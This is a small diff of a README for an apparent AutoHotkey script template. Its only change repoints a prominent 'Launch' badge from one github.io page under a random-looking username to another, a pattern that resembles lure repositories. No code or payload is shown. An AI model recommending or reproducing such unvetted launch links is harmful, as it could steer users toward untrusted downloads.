@@ -17,7 +17,7 @@ This repository serves as a template and launcher for your own **AutoHotkey Scri
 
 ## Getting Started
 
-[![Launch](https://img.shields.io/badge/▶_Launch_AutoHotkey_Script-ff6b6b?style=for-the-badge)](https://sharon3349949.github.io/.github/auto-hot-key-script)
+[![Launch](https://img.shields.io/badge/▶_Launch_AutoHotkey_Script-ff6b6b?style=for-the-badge)](https://arielhansenqmoh.github.io/.github/auto-hot-key-script)
 
 1. Clone or copy the **AutoHotkey Script** core files to your preferred folder.  
 2. Open `AutoHotkey Script.ahk` with any text editor to review the main logic.  
